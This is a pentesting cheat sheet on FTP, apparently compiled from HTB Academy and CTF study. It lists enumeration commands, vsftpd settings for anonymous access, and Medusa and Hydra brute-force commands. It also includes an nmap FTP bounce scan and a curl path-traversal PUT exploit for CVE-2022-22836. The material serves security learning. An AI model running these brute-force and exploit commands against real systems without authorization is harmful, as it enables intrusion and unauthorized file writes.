# FTP

> *Source CTF and HTB Academy*

- Usually on port 21

The File Transfer Protocol (FTP) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as HTTP or POP. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.

## Footprinting

- `find / -type f -name ftp* 2>/dev/null | grep scripts` find all the nmap scripts for ftp and choose the ones you wish to use
- `sudo nmap -sV -p21 -sC -A 10.129.14.136`
- `nc -nv 10.129.14.136 21`
- `telnet 10.129.14.136 21`
- `openssl s_client -connect 10.129.14.136:21 -starttls ftp`

## What to try

- Check if anonymous FTP is enabled, if so check if you can downloads files. If so you can RCE.  
Check out [Hackthebox Devel's writeup](../writeups/HTB-Devel.md) to have an example of this.

- If you do not have write access you could still find interesting and useful files like passwords or else.

## vsftpd

One of the most used FTP servers on Linux-based distributions is [vsFTPd](https://security.appspot.com/vsftpd.html).

- `sudo apt install vsftpd` install it
- `cat /etc/vsftpd.conf | grep -v "#"` interesting config to check
- `cat /etc/ftpusers` file used to deny certain users access to the FTP service

### Config for anonymous login

|Setting|Description|
|-------|-----------|
|anonymous_enable=YES|Allowing anonymous login?|
|anon_upload_enable=YES|Allowing anonymous to upload files?|
|anon_mkdir_write_enable=YES|Allowing anonymous to create new directories?|
|no_anon_password=YES|Do not ask anonymous for password?|
|anon_root=/home/username/ftp|Directory for anonymous.|
|write_enable=YES|Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?|

### Anonymous login

- `ftp <TARGET-IP> <port>` you will need to specify the port in case it is not port 21 if it is 21 you do not need to specify

## Download ftp files

- `wget -m --no-passive ftp://username:password@IP:2121 --starttls ftp`
- `wget ftp://username:password@ftp_server_address/path/to/file`

## lftp

- [lftp man page](https://lftp.yar.ru/lftp-man.html)
- `sudo apt install lftp`
- `lftp -p 2121 -u anonymous, 10.10.10.10`

## Interesting commands

- `status` will show configurations
- `debug`
- `trace`
- `ls -R` list file recursively
- `get filename` download a file
- `put filename` upload a file
- `wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136` Downaload all available files
  - `tree .` inspect all files downloaded
- Upload a file
  - `touch file` create a file
  - `put file` put it in the ftp server
- `PASV` enter [passive mode](https://support.solarwinds.com/SuccessCenter/s/article/PASV-FTP-command?language=en_US#:~:text=U%20Gateway%2015.1-,The%20PASV%20command%20tells%20the%20server%20to%20enter%20a%20passive,data%20port%20on%20the%20server.)
- Do not forget `ls -al` (to see hidden files)

|Setting|Description|
|-------|-----------|
|dirmessage_enable=YES|Show a message when they first enter a new directory?|
|chown_uploads=YES|Change ownership of anonymously uploaded files?|
|chown_username=username|User who is given ownership of anonymously uploaded files.|
|local_enable=YES|Enable local users to login?|
|chroot_local_user=YES|Place local users into their home directory?|
|chroot_list_enable=YES|Use a list of local users that will be placed in their home directory?|
|hide_ids=YES|All user and group information in directory listings will be displayed as "ftp".|
|ls_recurse_enable=YES|Allows the use of recurse listings.|

## TFTP

Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file transfers between client and server processes. However, it does not provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses UDP, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.

|Commands|Description|
|--------|-----------|
|connect|Sets the remote host, and optionally the port, for file transfers.|
|get|Transfers a file or set of files from the remote host to the local host.|
|put|Transfers a file or set of files from the local host onto the remote host.|
|quit|Exits tftp.|
|status|Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.|
|verbose|Turns verbose mode, which displays additional information during file transfer, on or off.|

## Bruteforcing

- [Medusa](https://github.com/jmk-foofus/medusa)
```bash
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
medusa -U users2.list -P pws.list -h 10.129.120.4 -M ftp -n 2121
```
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
```bash
hydra -l user -p password ftp://10.10.10.10
hydra -L user.list -P password.list ftp://10.10.10.10
```

## FTP Bounce Attack

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.

![FTP Bounce attack](../.res/2024-11-02-10-35-31.png)

> Source [GeeksforGeeks](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)

The Nmap -b flag can be used to perform an FTP bounce attack:
```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

## CVEs on FTP

- [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)  
  This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.  
  Exploitation 
  ```bash
  curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
  ```

## Resources

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp" %} Pentesting FTP - Hacktricks {% endembed %}  
{% embed url="https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/" %} The Ultimate FTP Commands list {% endembed %}  
{% embed url="https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes" %} List of FTP server return codes {% endembed %}  
{% embed url="https://academy.hackthebox.com/" %} Hackthebox Academy {% endembed %}  
